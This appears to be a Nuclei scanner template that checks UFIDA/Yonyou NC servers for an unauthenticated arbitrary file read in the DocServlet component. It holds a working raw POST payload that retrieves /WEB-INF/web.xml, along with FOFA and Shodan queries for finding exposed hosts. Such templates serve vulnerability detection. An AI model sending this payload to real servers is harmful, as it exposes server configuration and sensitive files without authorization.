http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "application/xml")
    - contains_all(body, "<web-app", "<?xml version")
    type: dsl
  raw:
  - 'POST /service/~webrt/nc.uap.lfw.file.action.DocServlet HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    pageId=login&disp=/WEB-INF/web.xml

    '
id: yonyou-nc-lfi
info:
  author: vva
  description: 'UFIDA NC is vulnerable to an arbitrary file read vulnerability in
    the nc.uap.lfw.file.action.DocServlet component. An unauthenticated remote attacker
    can exploit this flaw to read sensitive files on the server by sending crafted
    requests.

    '
  impact: 'Successful exploitation allows attackers to access sensitive files and
    information stored on the server.

    '
  metadata:
    fofa-query: "app=\"\u7528\u53CB-UFIDA-NC\""
    max-request: 1
    shodan-query: "http.title:\"\u7528\u53CB\" \"NC\""
    verified: true
  name: UFIDA NC - Arbitrary File Read
  reference:
  - https://github.com/szjr123/Target-practice/blob/05ed667090d8040a09235826f7698ff5347a93cf/%E7%94%A8%E5%8F%8BOA/NC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96_DocServlet/yongyou_read.py
  severity: high
  tags: yonyou,ufida,lfi
